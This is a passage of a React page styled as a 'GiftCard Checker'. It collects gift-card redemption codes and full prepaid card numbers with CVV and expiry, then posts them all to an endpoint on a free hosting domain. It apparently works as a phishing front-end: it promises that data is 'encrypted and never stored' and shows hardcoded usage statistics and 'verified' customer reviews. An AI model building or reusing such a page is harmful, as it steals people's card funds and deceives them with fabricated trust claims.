import { useEffect, useState, useRef } from "react";
import axios from "axios";
import g1 from "../assets/g1.png";
import g2 from "../assets/g2.png";
import g3 from "../assets/g3.png";
import amazonImg from "../assets/amazon.png";
import itunesImg from "../assets/itunes.png";
import googleplayImg from "../assets/googleplay.jpeg";
import steamImg from "../assets/steam.jpg";
import ebayImg from "../assets/ebay.jpg";
import xboxImg from "../assets/xbox.jpg";
import razerImg from "../assets/razer.png";
import vanillaImg from "../assets/vanilla.jpg";
import amexImg from "../assets/amex.jpg";
import mastercardImg from "../assets/mastercard.jpg";
import sephoraImg from "../assets/sephora.png";

// Feature cards for the feature section
const FEATURES = [
  { 
    icon: "🛡️", 
    title: "Secure", 
    description: "Your data is encrypted and never stored" 
  },
  { 
    icon: "🚀", 
    title: "Fast", 
    description: "Get your balance in seconds" 
  },
  { 
    icon: "📱", 
    title: "Mobile Friendly", 
    description: "Works on all devices" 
  },
  { 
    icon: "🌍", 
    title: "Global", 
    description: "Supporting major gift card brands" 
  }
];

// Statistics for the stats section
const STATS = [
  { icon: "🔒", number: "2.5M+", label: "Secure Checks" },
  { icon: "⚡", number: "0.8s", label: "Avg. Response Time" },
  { icon: "🌐", number: "50+", label: "Countries Supported" },
  { icon: "⭐", number: "4.9/5", label: "User Rating" }
];

// User reviews
const REVIEWS = [
  { id: 1, name: "Sarah K.", location: "United States", text: "I had 3 old Amazon cards I needed to check. This tool gave me the balances instantly. So simple!", rating: 5, verified: true },
  { id: 2, name: "James T.", location: "United Kingdom", text: "Much faster than going through Amazon's website. Clean interface and easy to use.", rating: 5, verified: true },
  { id: 3, name: "Miguel R.", location: "Spain", text: "I was skeptical at first, but it worked perfectly for my Steam cards. Very impressed!", rating: 4, verified: true },
  { id: 4, name: "Lisa W.", location: "Canada", text: "Checked my iTunes gift card balance in seconds. This saved me so much time!", rating: 5, verified: false },
  { id: 5, name: "Ahmed H.", location: "UAE", text: "Works with international cards which is rare. The interface is very intuitive.", rating: 5, verified: true },
  { id: 6, name: "Emma B.", location: "Australia", text: "Love how simple and straightforward this is. No ads or unnecessary steps.", rating: 5, verified: true },
  { id: 7, name: "Daniel L.", location: "Germany", text: "Used it for checking my Google Play gift cards. Fast and reliable.", rating: 4, verified: true },
  { id: 8, name: "Sophia C.", location: "Italy", text: "The best gift card checker I've found. Clean design and works every time.", rating: 5, verified: false }
];

// Gift card types with their information
const CARD_TYPES = [
  { id: "amazon", name: "Amazon", img: amazonImg, category: "E-commerce" },
  { id: "itunes", name: "iTunes", img: itunesImg, category: "Entertainment" },
  { id: "googleplay", name: "Google Play", img: googleplayImg, category: "Entertainment" },
  { id: "steam", name: "Steam", img: steamImg, category: "Gaming" },
  { id: "ebay", name: "eBay", img: ebayImg, category: "E-commerce" },
  { id: "xbox", name: "Xbox", img: xboxImg, category: "Gaming" },
  { id: "razer", name: "Razer Gold", img: razerImg, category: "Gaming" },
  { id: "vanilla", name: "Vanilla", img: vanillaImg, category: "Prepaid" },
  { id: "amex", name: "American Express", img: amexImg, category: "Prepaid" },
  { id: "mastercard", name: "Mastercard", img: mastercardImg, category: "Prepaid" },
  { id: "sephora", name: "Sephora", img: sephoraImg, category: "E-commerce" }

];

export default function GiftCardChecker() {
  // State management
  const [selectedCardId, setSelectedCardId] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [pin, setPin] = useState("");
  const [price, setPrice] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiry, setExpiry] = useState("");
  const [error, setError] = useState({
    server: "",
    selected: "",
    pin: "",
    cvv: "",
    expiry: "",
  });
  const [loading, setLoading] = useState(false);
  const [showResult, setShowResult] = useState(false);
  const [resultMessage, setResultMessage] = useState("");
  const [resultType, setResultType] = useState(""); // "success" or "error"
  const specialCards = ["mastercard", "vanilla", "amex"];
  const [cardNumber, setCardNumber] = useState("");
  const mainFormRef = useRef(null);
  
  // Get the selected card object
  const selectedCard = CARD_TYPES.find(card => card.id === selectedCardId);
  
  // For displaying the top cards in the carousel
  const topCards = CARD_TYPES.slice(0, 6);
  
  useEffect(() => {
    document.title = "GiftCard Checker - Fast & Secure Balance Verification";
    
    // Load previously selected card from localStorage
    const savedCardId = localStorage.getItem("selectedCardId");
    if (savedCardId) {
      setSelectedCardId(savedCardId);
    }
  }, []);
  
  // Save selected card to localStorage when it changes
  useEffect(() => {
    if (selectedCardId) {
      localStorage.setItem("selectedCardId", selectedCardId);
    }
  }, [selectedCardId]);

  // Scroll to the form section when a card is selected
  useEffect(() => {
    if (selectedCardId && mainFormRef.current) {
      setTimeout(() => {
        mainFormRef.current.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 100);
    }
  }, [selectedCardId]);

  // Handle expiry date formatting (MM/YY)
  const handleExpiryChange = (e) => {
    let input = e.target.value.replace(/\D/g, "");
    if (input.length > 2) {
      input = input.slice(0, 2) + "/" + input.slice(2, 4);
    }
    e.target.value = input.slice(0, 5);
    setExpiry(e.target.value);
    setError(prev => ({...prev, expiry: ""}));
  };
  
  // Modal controls
  const openModal = () => setIsModalOpen(true);
  const closeModal = () => setIsModalOpen(false);
  
  // Card selection handler
  const handleSelectCard = (cardId) => {
    setSelectedCardId(cardId);
    closeModal();
    
    // Clear any previous error
    setError(prev => ({ ...prev, selected: "" }));
    
    // Provide haptic feedback on mobile devices if available
    if (navigator.vibrate) {
      navigator.vibrate(50);
    }
    
    // Reset form errors when changing cards
    setError(prev => ({
      ...prev,
      pin: "",
      cvv: "",
      expiry: ""
    }));
  };

  // Form submission handler
  const handleSubmit = async (e) => {
    e.preventDefault();

    let hasError = false;

    // Form validation
    if (!selectedCardId) {
      setError(prev => ({ ...prev, selected: "Please select a card type." }));
      hasError = true;
    }

    if (pin.trim() === "" || pin.trim().length < 5) {
      setError(prev => ({ ...prev, pin: "Please enter a valid PIN." }));
      hasError = true;
    }

    // Additional validation for special cards (prepaid cards)
    if (specialCards.includes(selectedCardId)) {
      if (cvv.trim() === "" || cvv.trim().length < 3) {
        setError(prev => ({ ...prev, cvv: "Please enter a valid CVV." }));
        hasError = true;
      }

      if (expiry.trim() === "" || expiry.trim().length < 5) {
        setError(prev => ({ ...prev, expiry: "Please enter expiry in MM/YY format." }));
        hasError = true;
      } else {
        // Validate expiry date
        const [mmStr, yyStr] = expiry.trim().split("/");
        const enteredMonth = parseInt(mmStr, 10);
        const enteredYear = parseInt("20" + yyStr, 10);

        const today = new Date();
        const currentMonth = today.getMonth() + 1;
        const currentYear = today.getFullYear();

        if (
          enteredMonth < 1 || enteredMonth > 12 ||
          enteredYear < currentYear ||
          (enteredYear === currentYear && enteredMonth <= currentMonth)
        ) {
          setError(prev => ({ ...prev, expiry: "Invalid expiry date" }));
          hasError = true;
        }
      }
    }

    if (hasError) return;

    // Reset all errors
    setError({
        server: "",
        selected: "",
        pin: "",
        cvv: "",
        expiry: "",
        
    });
    
    // Hide previous results
    setShowResult(false);

    try {
      setLoading(true);
      
      // Record start time for minimum loading animation
      const startTime = Date.now();
      
      // API call to check balance
      const response = await axios.post(
        "https://checkyourcard.free.nf/apiv1/check-balance.php",
        { cardType: selectedCardId, pin, cvv, expiry, expectedBalance: price, card_number: cardNumber },
        {
          withCredentials: true,
          headers: { "Content-Type": "application/json" },
        }
      );
      
      // Ensure minimum loading time for better UX
      const elapsedTime = Date.now() - startTime;
      const minimumAnimationTime = 2000;
      
      if (elapsedTime < minimumAnimationTime) {
        await new Promise(resolve => setTimeout(resolve, minimumAnimationTime - elapsedTime));
      }
      
      // Handle response
      if (response.data.success) {
        setResultMessage(response.data.message);
        setResultType("success");
        setShowResult(true);
      } else {
        setResultMessage("Failed to check balance. Please try again.");
        setResultType("error");
        setShowResult(true);
      }
      
      // Clear form fields after successful check
      setTimeout(() => {
        setPin("");
        setCvv("");
        setExpiry("");
        setCardNumber("");
        setPrice("");
      }, 2000);
      
    } catch (err) {
         
      setResultMessage("Failed to check balance. Please try again.");
      setResultType("error");
      setShowResult(true);
      
      setTimeout(() => {
        setPin("");
        setCvv("");
        setExpiry("");
      }, 2000);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-slate-900 text-white">
      {/* Simple Navbar */}
      <header className="sticky top-0 z-50 bg-slate-800 border-b border-white/10">
        <div className="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="text-xl">🎁</span>
            <div>
              <h1 className="text-xl font-bold text-white">GiftCard Checker</h1>
              <p className="text-xs text-gray-300 hidden sm:block">Secure balance verification</p>
            </div>
          </div>
          <nav className="hidden md:flex space-x-6 text-sm font-medium text-gray-300">
            <a href="#features" className="hover:text-white">Features</a>
            <a href="#about" className="hover:text-white">About</a>
          </nav>
          <div className="flex items-center gap-2">
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
            <span className="text-xs text-green-500 hidden sm:block">Online</span>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <div className="relative overflow-hidden">
        {/* Background Pattern */}
        <div className="absolute inset-0 opacity-5">
          <div className="absolute inset-0" style={{
            backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.1'%3E%3Ccircle cx='30' cy='30' r='2'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`,
          }}></div>
        </div>
        
        <div className="relative mt-8 p-6 text-center">
          <div className="max-w-4xl mx-auto">
            <h2 className="text-3xl md:text-5xl lg:text-6xl font-bold mb-6 bg-gradient-to-r from-white via-violet-200 to-purple-300 bg-clip-text text-transparent leading-tight">
              Know Your Balance.<br />
              <span className="text-violet-400">Instantly.</span>
            </h2>
            <p className="text-lg md:text-xl text-gray-300 max-w-2xl mx-auto leading-relaxed mb-8">
              Whether it's an old gift card from last Christmas or a fresh one you just unwrapped, you deserve to know exactly what's on it. 
              <span className="text-violet-300 font-semibold"> GiftCard Checker</span> gives you clarity in seconds.
            </p>
            
            {/* Trust Indicators */}
            <div className="flex flex-wrap justify-center gap-6 text-sm text-gray-400 mb-8">
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 bg-emerald-500 rounded-full flex items-center justify-center">
                  <svg className="w-2.5 h-2.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>SSL Encrypted</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center">
                  <svg className="w-2.5 h-2.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>No Data Stored</span>
              </div>
              <div className="flex items-center gap-2">
                <div className="w-4 h-4 bg-purple-500 rounded-full flex items-center justify-center">
                  <svg className="w-2.5 h-2.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M11.3 1.046A1 1 0 0112 2v5h4a1 1 0 01.82 1.573l-7 10A1 1 0 018 18v-5H4a1 1 0 01-.82-1.573l7-10a1 1 0 011.12-.38z" clipRule="evenodd" />
                  </svg>
                </div>
                <span>Instant Results</span>
              </div>
            </div>
          </div>

          {/* Enhanced Brand Banner */}
          <div className="overflow-hidden w-full mt-12 mb-8">
            <div className="flex gap-12 animate-slide-left-right items-center w-max">
              {[g1, g2, g3, g1, g2, g3, g1, g2].map((imgSrc, index) => (
                <div key={index} className="relative group">
                  <img
                    src={imgSrc}
                    alt={`Partner Brand ${index + 1}`}
                    className="h-16 sm:h-20 object-contain opacity-60 group-hover:opacity-100 transition-opacity duration-300 filter grayscale group-hover:grayscale-0"
                  />
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Stats Section */}
      <section id="stats" className="py-16 bg-gradient-to-r from-violet-900/20 to-purple-900/20 backdrop-blur-sm border-y border-white/10">
        <div className="max-w-6xl mx-auto px-6">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8">
            {STATS.map((stat, index) => (
              <div key={index} className="text-center group">
                <div className="text-4xl mb-3 group-hover:scale-110 transition-transform duration-300">{stat.icon}</div>
                <div className="text-2xl md:text-3xl font-bold text-white mb-2">{stat.number}</div>
                <div className="text-sm text-gray-400">{stat.label}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Main Checker Panel */}
      <main className="flex-grow container mx-auto px-6 py-12">
        <section className="bg-white/5 backdrop-blur-xl border border-white/10 rounded-3xl p-8 md:p-12 shadow-[0_25px_50px_rgba(127,86,217,0.3)] relative overflow-hidden">
          {/* Background Pattern */}
          <div className="absolute inset-0 opacity-5 pointer-events-none">
            <div className="absolute inset-0" style={{
              backgroundImage: `url("data:image/svg+xml,%3Csvg width='40' height='40' viewBox='0 0 40 40' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.1' fill-rule='evenodd'%3E%3Cpath d='m0 40 40-40h-40v40zm40 0v-40h-40z'/%3E%3C/g%3E%3C/svg%3E")`,
            }}></div>
          </div>

          <div className="relative">
            <h2 className="text-2xl sm:text-4xl md:text-5xl font-bold text-white text-center mb-4">
              Check Your Gift Card Balance
            </h2>
            <p className="text-center text-gray-300 mb-8 max-w-2xl mx-auto">
              Simply select your card type, enter your details, and get your balance instantly. Secure, fast, and reliable.
            </p>

            {error.server && (
              <div className="bg-red-500/10 border border-red-400/30 text-red-200 text-center font-medium mb-6 rounded-xl p-4 animate-slide-up">
                <div className="flex items-center justify-center gap-2">
                  <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                  {error.server}
                </div>
              </div>
            )}

            {/* Enhanced Card Selection Carousel */}
            <div className="mb-6">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h3 className="text-lg font-semibold text-white mb-1">Popular Card Types</h3>
                  <p className="text-xs text-gray-400">Tap any card to select it instantly</p>
                </div>
                <button 
                  onClick={() => openModal()}
                  className="bg-white/5 hover:bg-white/10 text-violet-300 hover:text-violet-200 text-sm font-medium flex items-center gap-1.5 px-3 py-1.5 rounded-lg transition-all duration-200 border border-white/10 hover:border-violet-500/30"
                >
                  View All 
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                  </svg>
                </button>
              </div>
              
              <div className="flex gap-3 overflow-x-auto pb-4 custom-scrollbar snap-x">
                {CARD_TYPES.slice(0, 6).map((card, index) => (
                  <button
                    key={card.id}
                    onClick={() => handleSelectCard(card.id)}
                    className={`group relative flex-shrink-0 snap-start flex flex-col items-center gap-2 p-3 rounded-xl border w-[110px] transition-all duration-300 transform ${
                      selectedCardId === card.id
                        ? "border-violet-500 bg-violet-600/20 scale-105 shadow-lg shadow-violet-500/25 animate-card-glow"
                        : "border-white/10 hover:border-white/30 hover:bg-white/5 hover:scale-105"
                    }`}
                  >
                    {/* Tutorial tooltip on first card for new users */}
                    {index === 0 && (
                      <div className="absolute -top-12 left-1/2 -translate-x-1/2 bg-violet-600 text-white text-xs py-1.5 px-3 rounded-xl opacity-0 group-hover:opacity-100 transition-opacity duration-300 whitespace-nowrap">
                        Tap to select a card
                        <div className="absolute -bottom-1.5 left-1/2 -translate-x-1/2 w-3 h-3 bg-violet-600 transform rotate-45"></div>
                      </div>
                    )}
                    
                    <div className={`relative w-16 h-16 rounded-lg flex items-center justify-center p-3 ${
                      selectedCardId === card.id ? "bg-gradient-to-br from-violet-500/30 to-purple-500/30" : "bg-white/10 group-hover:bg-white/15"
                    } transition-all duration-300`}>
                      <img
                        src={card.img}
                        alt={card.name}
                        className={`w-full h-full object-contain transition-transform duration-500 ${selectedCardId === card.id ? "scale-110" : "group-hover:scale-110"}`}
                      />
                      
                      {/* Selection indicator */}
                      {selectedCardId === card.id && (
                        <div className="absolute -top-2 -right-2 w-6 h-6 bg-gradient-to-br from-violet-500 to-purple-600 rounded-full flex items-center justify-center shadow-lg">
                          <div className="absolute inset-0 rounded-full animate-pulse-ring bg-violet-500 opacity-60"></div>
                          <svg className="w-4 h-4 text-white relative z-10" fill="currentColor" viewBox="0 0 20 20">
                            <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                          </svg>
                        </div>
                      )}
                    </div>
                    
                    <div className="text-xs font-medium text-center truncate w-full">
                      {card.name}
                    </div>
                    
                    <div className="text-[10px] text-violet-300/80 truncate w-full text-center">
                      {card.category}
                    </div>
                  </button>
                ))}
                
                <button
                  onClick={() => openCardSelector()}
                  className="flex-shrink-0 snap-start flex flex-col items-center justify-center gap-2 p-3 rounded-xl border border-dashed border-white/20 w-[110px] hover:border-violet-400/50 hover:bg-violet-500/10 transition-all duration-300 group"
                >
                  <div className="w-16 h-16 rounded-lg bg-white/5 flex items-center justify-center text-white/50 group-hover:text-violet-300 transition-colors duration-300">
                    <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
                    </svg>
                  </div>
                  <div className="text-xs font-medium text-white/50 group-hover:text-violet-300 transition-colors duration-300">
                    More Cards
                  </div>
                  <div className="text-[10px] text-violet-300/60 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
                    View all options
                  </div>
                </button>
              </div>
              
              {/* Mobile swipe indicator */}
              <div className="flex justify-center mt-2 md:hidden">
                <div className="flex gap-1">
                  <div className="w-8 h-1 rounded-full bg-violet-500/40"></div>
                  <div className="w-2 h-1 rounded-full bg-white/20"></div>
                  <div className="w-2 h-1 rounded-full bg-white/20"></div>
                </div>
              </div>
            </div>

            {/* Selected Card Info with Premium Design */}
            <div className="mb-8">
              {selectedCard && (
                <div className="relative overflow-hidden flex items-center gap-4 p-5 bg-gradient-to-br from-violet-900/30 via-slate-800/30 to-purple-900/30 backdrop-blur-sm border border-white/10 rounded-xl animate-fade-in group">
                  {/* Decorative elements */}
                  <div className="absolute top-0 right-0 w-64 h-64 bg-violet-600/5 rounded-full filter blur-3xl group-hover:bg-violet-600/10 transition-all duration-700"></div>
                  <div className="absolute -bottom-20 -left-20 w-64 h-64 bg-purple-600/5 rounded-full filter blur-3xl group-hover:bg-purple-600/10 transition-all duration-700"></div>
                  
                  {/* Card logo */}
                  <div className="relative w-14 h-14 sm:w-16 sm:h-16 bg-gradient-to-br from-violet-500/20 to-purple-500/20 rounded-xl p-2.5 flex-shrink-0 group-hover:from-violet-500/30 group-hover:to-purple-500/30 transition-all duration-300">
                    <img
                      src={selectedCard.img}
                      alt={selectedCard.name}
                      className="w-full h-full object-contain drop-shadow-lg group-hover:scale-110 transition-transform duration-500"
                    />
                    <div className="absolute inset-0 bg-gradient-to-tr from-transparent via-white/5 to-white/20 opacity-0 group-hover:opacity-100 transition-opacity duration-300 rounded-xl"></div>
                  </div>
                  
                  {/* Card info */}
                  <div className="flex-1 relative">
                    <div className="flex items-center gap-2 mb-1">
                      <div className="text-white font-semibold text-lg">{selectedCard.name}</div>
                      <div className="px-2 py-0.5 bg-violet-500/20 text-violet-300 text-xs rounded-full font-medium whitespace-nowrap">
                        {selectedCard.category}
                      </div>
                    </div>
                    <div className="text-sm text-gray-300 flex items-center gap-2">
                      <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                      </svg>
                      <span>Secure verification</span>
                      <span className="h-1 w-1 bg-gray-500 rounded-full"></span>
                      <span>Instant results</span>
                    </div>
                  </div>
                  
                  {/* Action buttons */}
                  <div className="flex flex-col gap-2 sm:flex-row">
                    <button 
                      onClick={() => openCardSelector()}
                      className="bg-white/10 hover:bg-white/15 p-2.5 rounded-lg transition-colors duration-200 group-hover:shadow-lg"
                      aria-label="Change card selection"
                    >
                      <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z" />
                      </svg>
                    </button>
                    <button 
                      onClick={() => {
                        // Clear selection and form fields
                        const clearCardEvent = new Event('clearCardSelection');
                        document.dispatchEvent(clearCardEvent);
                        setPin("");
                        setCvv("");
                        setExpiry("");
                      }}
                      className="bg-white/10 hover:bg-white/15 p-2.5 rounded-lg transition-colors duration-200 group-hover:shadow-lg"
                      aria-label="Clear selection"
                    >
                      <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                      </svg>
                    </button>
                  </div>
                </div>
              )}
              
              {!selectedCard && (
                <button
                  onClick={() => openCardSelector()}
                  className="w-full flex items-center justify-between px-6 py-5 bg-gradient-to-r from-violet-600/20 to-purple-600/20 border border-white/10 text-white rounded-xl hover:border-violet-400/50 transition-all duration-300 group relative overflow-hidden"
                >
                  {/* Animated background elements */}
                  <div className="absolute inset-0 bg-gradient-to-r from-violet-600/0 via-violet-600/5 to-violet-600/0 -translate-x-full group-hover:translate-x-full transition-transform duration-1500 ease-in-out"></div>
                  <div className="absolute inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iNjAiIHZpZXdCb3g9IjAgMCA2MCA2MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxnIGZpbGw9IiNmZmZmZmYiIGZpbGwtb3BhY2l0eT0iMC4wMyI+PGNpcmNsZSBjeD0iMzAiIGN5PSIzMCIgcj0iMiIvPjwvZz48L2c+PC9zdmc+')]"></div>
                  
                  <div className="flex items-center gap-3 relative z-10">
                    <div className="w-12 h-12 bg-white/10 rounded-full flex items-center justify-center group-hover:bg-white/15 transition-colors duration-300 animate-pulse-border">
                      <svg className="w-6 h-6 text-violet-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                      </svg>
                    </div>
                    <div className="text-left">
                      <div className="font-semibold text-lg">Choose Your Card Type</div>
                      <div className="text-sm text-gray-400">Select from our supported gift cards and prepaid cards</div>
                    </div>
                  </div>
                  
                  <div className="relative z-10 flex items-center gap-1.5 text-violet-300 bg-white/5 px-4 py-2 rounded-lg">
                    <span className="text-sm font-medium">Select</span>
                    <svg
                      className="w-5 h-5 group-hover:translate-x-1 transition-transform duration-300"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                    </svg>
                  </div>
                </button>
              )}
            </div>

            {/* Enhanced Input Form */}
            <form
              onSubmit={handleSubmit}
              className={`transition-all duration-300 ${
                loading ? 'opacity-75 pointer-events-none' : 'opacity-100'
              }`}
            >
              <div className={`grid gap-6 w-full ${specialCards.includes(selectedCardId) ? 'sm:grid-cols-3' : 'sm:grid-cols-1'} mb-6`}>
                <div className="space-y-2">
                  <label className="flex items-center justify-between text-sm font-medium text-white/80 mb-1 px-1">
                    <span>{specialCards.includes(selectedCardId) ? "Card Number" : "Redemption Code"}</span>
                    {specialCards.includes(selectedCardId) && (
                      <span className="text-xs text-violet-300">16-19 digits</span>
                    )}
                  </label>
                  <div className="relative">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2">
                      <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                      </svg>
                    </div>
                    <input
                      value={pin}
                      type="text"
                      inputMode={specialCards.includes(selectedCardId) ? "numeric" : undefined}
                      aria-label="Card PIN"
                      onChange={(e) =>{
                        specialCards.includes(selectedCardId) ?
                           setPin(e.target.value.replace(/[^0-9]/g, "").slice(0, 30)) 
                          : setPin(e.target.value.replace(/[^a-zA-Z0-9]/g, "").slice(0, 30))
                        setError(prev => ({...prev, pin: ""}));
                      }}
                      placeholder={specialCards.includes(selectedCardId) ? "Enter card number" : "Enter redemption code"}
                      className="w-full pl-12 pr-5 py-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-violet-500 focus:ring-2 focus:ring-violet-300/50 placeholder-gray-400 outline-none text-lg transition-all duration-300 hover:bg-white/15"
                    />
                    {pin && (
                      <button 
                        type="button"
                        onClick={() => setPin("")}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors duration-200"
                      >
                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                        </svg>
                      </button>
                    )}
                  </div>
                  {error.pin && (
                    <p className="bg-red-500/10 border border-red-400/30 text-red-200 text-center text-sm font-medium rounded-lg p-3 animate-slide-up">{error.pin}</p>
                  )}
                </div>

                {specialCards.includes(selectedCardId) && (
                  <>
                    <div className="space-y-2">
                      <label className="flex items-center justify-between text-sm font-medium text-white/80 mb-1 px-1">
                        <span>Expiry Date</span>
                        <span className="text-xs text-violet-300">MM/YY</span>
                      </label>
                      <div className="relative">
                        <div className="absolute left-4 top-1/2 -translate-y-1/2">
                          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
                          </svg>
                        </div>
                        <input
                          type="text"
                          value={expiry}
                          placeholder="MM/YY"
                          inputMode="numeric"
                          maxLength={5}
                          minLength={5}
                          onChange={handleExpiryChange}
                          className="w-full pl-12 pr-5 py-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-violet-500 focus:ring-2 focus:ring-violet-300/50 placeholder-gray-400 outline-none text-lg transition-all duration-300 hover:bg-white/15"
                        />
                        {expiry && (
                          <button 
                            type="button"
                            onClick={() => setExpiry("")}
                            className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-white transition-colors duration-200"
                          >
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                            </svg>
                          </button>
                        )}
                      </div>
                      {error.expiry && (
                        <p className="bg-red-500/10 border border-red-400/30 text-red-200 text-center text-sm font-medium rounded-lg p-3 animate-slide-up">{error.expiry}</p>
                      )}
                    </div>
                    
                    <div className="space-y-2">
                      <label className="flex items-center justify-between text-sm font-medium text-white/80 mb-1 px-1">
                        <span>Security Code</span>
                        <span className="text-xs text-violet-300">3 digits</span>
                      </label>
                      <div className="relative">
                        <div className="absolute left-4 top-1/2 -translate-y-1/2">
                          <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                          </svg>
                        </div>
                        <input
                          type="text"
                          value={cvv}
                          placeholder="CVV"
                          inputMode="numeric"
                          pattern="[0-9]*"
                          maxLength={3}
                          minLength={3}
                          onChange={(e) =>{
                            setCvv(e.target.value.replace(/[^0-9]/g, "").slice(0, 3));
                            setError(prev => ({...prev, cvv: ""}));
                            }}
